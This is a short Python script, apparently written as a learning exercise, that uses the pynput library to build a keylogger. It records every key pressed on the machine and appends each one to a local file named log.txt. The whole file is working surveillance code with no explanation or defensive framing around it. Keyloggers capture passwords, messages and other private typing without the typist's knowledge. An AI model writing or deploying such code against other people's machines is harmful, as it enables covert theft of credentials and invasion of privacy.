import pynput.keyboard

log = ""

def funcaoTecla(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        log += f"{key}"
        
    with open("log.txt", "a") as logs:
        if (log == "Key.space"):
            log = " "
        logs.write(log)
        log=""

listener = pynput.keyboard.Listener(on_press=funcaoTecla)
with listener:
    listener.join()